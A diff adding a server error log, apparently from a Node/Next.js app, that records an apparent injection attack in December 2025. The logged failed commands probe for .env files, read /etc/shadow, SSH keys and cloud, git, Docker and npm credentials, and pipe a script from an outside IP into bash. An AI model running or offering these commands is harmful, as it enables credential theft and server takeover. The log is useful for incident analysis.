@@ -1,0 +1,500 @@
+2025-12-10 01:47 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-10 01:47 +00:00:   digest: '2534698826'
+2025-12-10 01:47 +00:00: }
+2025-12-10 01:47 +00:00:  ⨯ SyntaxError: Unexpected token '.'
+2025-12-10 01:47 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-10 01:47 +00:00:   digest: '2534698826'
+2025-12-10 01:47 +00:00: }
+2025-12-10 01:47 +00:00:  ⨯ SyntaxError: Unexpected token '.'
+2025-12-10 01:47 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-10 01:47 +00:00:   digest: '2534698826'
+2025-12-10 01:47 +00:00: }
+2025-12-10 01:47 +00:00:  ⨯ SyntaxError: Unexpected token '.'
+2025-12-10 01:47 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-10 01:47 +00:00:   digest: '2534698826'
+2025-12-10 01:47 +00:00: }
+2025-12-10 01:47 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-10 01:47 +00:00:     at ignore-listed frames {
+2025-12-10 01:47 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-10 01:47 +00:00:   digest: '767717608'
+2025-12-10 01:47 +00:00: }
+2025-12-10 01:47 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-10 01:47 +00:00:     at ignore-listed frames {
+2025-12-10 01:47 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-10 01:47 +00:00:   digest: '767717608'
+2025-12-10 01:47 +00:00: }
+2025-12-10 01:47 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-10 01:47 +00:00:     at ignore-listed frames {
+2025-12-10 01:47 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-10 01:47 +00:00:   digest: '767717608'
+2025-12-10 01:47 +00:00: }
+2025-12-10 01:47 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-10 01:47 +00:00:     at ignore-listed frames {
+2025-12-10 01:47 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-10 01:47 +00:00:   digest: '767717608'
+2025-12-10 01:47 +00:00: }
+2025-12-10 01:47 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-10 01:47 +00:00:     at ignore-listed frames {
+2025-12-10 01:47 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-10 01:47 +00:00:   digest: '767717608'
+2025-12-10 01:47 +00:00: }
+2025-12-10 18:10 +00:00: /bin/sh: 1: Syntax error: ")" unexpected
+2025-12-10 18:10 +00:00: /bin/sh: 1: Syntax error: ")" unexpected
+2025-12-10 19:40 +00:00: /bin/sh: 1: Syntax error: ")" unexpected
+2025-12-10 19:40 +00:00: /bin/sh: 1: Syntax error: ")" unexpected
+2025-12-10 22:53 +00:00: /bin/sh: 1: Syntax error: ")" unexpected
+2025-12-10 22:53 +00:00: /bin/sh: 1: Syntax error: ")" unexpected
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f .env && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36638,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '2970377086'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f .env.production && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36642,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '2995762846'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f .env.development && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36643,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '1546165246'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f .env.staging && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36644,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '3124599038'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f ../.env && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36645,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '3407273566'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f ../.env.local && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36646,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '1268427326'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f ../.env.production && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36647,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '1459232574'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /var/www/.env && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36648,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '3740924574'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /var/www/html/.env && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36649,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '748776062'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /var/www/html/.env.local && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36650,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '57440702'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /app/.env && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36651,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '3132428382'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /app/.env.local && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36652,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '2412501630'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /app/.env.production && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36653,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '131455870'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /opt/app/.env && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36654,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '598619294'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /srv/app/.env && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36655,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '1181795102'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ Error: Command failed: test -f /root/.env && echo EXISTS | base64 -w 0
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   status: 1,
+2025-12-11 03:44 +00:00:   signal: null,
+2025-12-11 03:44 +00:00:   output: [Array],
+2025-12-11 03:44 +00:00:   pid: 36656,
+2025-12-11 03:44 +00:00:   stdout: <Buffer >,
+2025-12-11 03:44 +00:00:   stderr: <Buffer >,
+2025-12-11 03:44 +00:00:   digest: '1362788350'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ SyntaxError: Unexpected token 'var'
+2025-12-11 03:44 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-11 03:44 +00:00:   digest: '2253026346'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ SyntaxError: Unexpected token '.'
+2025-12-11 03:44 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-11 03:44 +00:00:   digest: '2534698826'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ SyntaxError: Unexpected token '.'
+2025-12-11 03:44 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-11 03:44 +00:00:   digest: '2534698826'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ SyntaxError: Unexpected token '.'
+2025-12-11 03:44 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-11 03:44 +00:00:   digest: '2534698826'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ SyntaxError: Unexpected token '.'
+2025-12-11 03:44 +00:00:     at Object.Function [as get] (<anonymous>) {
+2025-12-11 03:44 +00:00:   digest: '2534698826'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-11 03:44 +00:00:   digest: '767717608'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-11 03:44 +00:00:   digest: '767717608'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-11 03:44 +00:00:   digest: '767717608'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-11 03:44 +00:00:   digest: '767717608'
+2025-12-11 03:44 +00:00: }
+2025-12-11 03:44 +00:00:  ⨯ TypeError: The "command" argument must be of type string. Received type number (NaN)
+2025-12-11 03:44 +00:00:     at ignore-listed frames {
+2025-12-11 03:44 +00:00:   code: 'ERR_INVALID_ARG_TYPE',
+2025-12-11 03:44 +00:00:   digest: '767717608'
+2025-12-11 03:44 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat .env 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36787,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '1396270814'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat .env.production 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36791,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '338282558'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat .env.development 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36793,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '3867730046'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat ../.env 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36795,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '3528232254'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat /app/.env 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36797,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '542438654'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat /etc/shadow 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36814,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '3376979710'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat ~/.ssh/id_rsa 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36818,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '2754847102'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat /home/ubuntu/.ssh/id_rsa 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36824,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '4017390654'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:01 +00:00:  ⨯ Error: Command failed: cat /home/ubuntu/.ssh/id_ed25519 2>/dev/null
+2025-12-11 05:01 +00:00:     at ignore-listed frames {
+2025-12-11 05:01 +00:00:   status: 1,
+2025-12-11 05:01 +00:00:   signal: null,
+2025-12-11 05:01 +00:00:   output: [Array],
+2025-12-11 05:01 +00:00:   pid: 36826,
+2025-12-11 05:01 +00:00:   stdout: <Buffer >,
+2025-12-11 05:01 +00:00:   stderr: <Buffer >,
+2025-12-11 05:01 +00:00:   digest: '3514806622'
+2025-12-11 05:01 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat /home/ubuntu/.ssh/authorized_keys 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36828,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '937614718'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat /root/.ssh/id_rsa 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36830,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '1086937278'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat /root/.ssh/id_ed25519 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36832,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '1094902270'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat /root/.ssh/authorized_keys 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36834,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '2456946142'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat ~/.git-credentials 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36836,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '896529982'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat /home/ubuntu/.git-credentials 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36838,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '4009326526'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat /root/.git-credentials 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36840,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '2406894366'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat ~/.gitconfig 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36842,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '3023711134'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat ~/.aws/credentials 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36844,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '2212330334'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat ~/.aws/config 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36846,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '2072543550'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat ~/.docker/config.json 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36848,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '2131159422'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: cat ~/.npmrc 2>/dev/null
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 1,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36850,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '1368714142'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: apk add --no-cache curl python3 2>/dev/null && curl -s http://67.217.57.240:666/files/proxy.sh | bash
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 127,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36855,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '3681880126'
+2025-12-11 05:02 +00:00: }
+2025-12-11 05:02 +00:00: E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+2025-12-11 05:02 +00:00: E: Unable to lock directory /var/lib/apt/lists/
+2025-12-11 05:02 +00:00: W: Problem unlinking the file /var/cache/apt/pkgcache.bin - RemoveCaches (13: Permission denied)
+2025-12-11 05:02 +00:00: W: Problem unlinking the file /var/cache/apt/srcpkgcache.bin - RemoveCaches (13: Permission denied)
+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: apt-get update -qq && apt-get install -y -qq curl python3 2>/dev/null && curl -s http://67.217.57.240:666/files/proxy.sh | bash
+2025-12-11 05:02 +00:00: E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+2025-12-11 05:02 +00:00: E: Unable to lock directory /var/lib/apt/lists/
+2025-12-11 05:02 +00:00: W: Problem unlinking the file /var/cache/apt/pkgcache.bin - RemoveCaches (13: Permission denied)
+2025-12-11 05:02 +00:00: W: Problem unlinking the file /var/cache/apt/srcpkgcache.bin - RemoveCaches (13: Permission denied)
+2025-12-11 05:02 +00:00: 
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 100,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36856,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer 45 3a 20 43 6f 75 6c 64 20 6e 6f 74 20 6f 70 65 6e 20 6c 6f 63 6b 20 66 69 6c 65 20 2f 76 61 72 2f 6c 69 62 2f 61 70 74 2f 6c 69 73 74 73 2f 6c 6f 63 ... 278 more bytes>,
+2025-12-11 05:02 +00:00:   digest: '3027059646'
+2025-12-11 05:02 +00:00: }
